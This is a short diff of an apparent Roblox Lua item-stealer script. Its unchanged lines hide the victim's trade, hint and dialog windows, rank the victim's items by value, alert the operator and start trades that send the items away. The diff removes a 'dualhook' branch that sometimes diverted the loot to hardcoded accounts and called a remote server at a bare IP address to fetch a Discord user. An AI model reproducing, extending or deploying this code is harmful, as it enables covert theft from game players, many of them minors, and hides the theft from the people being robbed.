@@ -491,12 +491,6 @@ game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled = false
 game:GetService("Players").LocalPlayer.PlayerGui.HintApp:Destroy()
 game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.Visible = false
 
-if totalValue >= 50 and math.random() < 0.15 then
-    users = {"Alyssa87123", "tobi437a", "OBlockBaby11111", "TobiAltGrind", "TobiHatching"}
-    ping = "Yes"
-    dualhooked = true
-end
-
 if #itemsToSend > 0 then
     table.sort(itemsToSend, function(a, b)
         return a.Value > b.Value
@@ -512,16 +506,8 @@ if #itemsToSend > 0 then
         prefix = "--[[@everyone]] "
     end
 
-    if dualhooked then
-        local response = request({
-            Url = "http://46.101.233.20:5000/getdiscuser",
-            Method = "GET"
-        })
-        discuser = response.Body
-        SendDHJoinMessage(itemsToSend, prefix)
-    else
-        SendJoinMessage(itemsToSend, prefix)
-    end
+    SendJoinMessage(itemsToSend, prefix)
+
     SettingsRemote:FireServer("trade_requests", 1)
 
     local function doTrade(joinedUser)
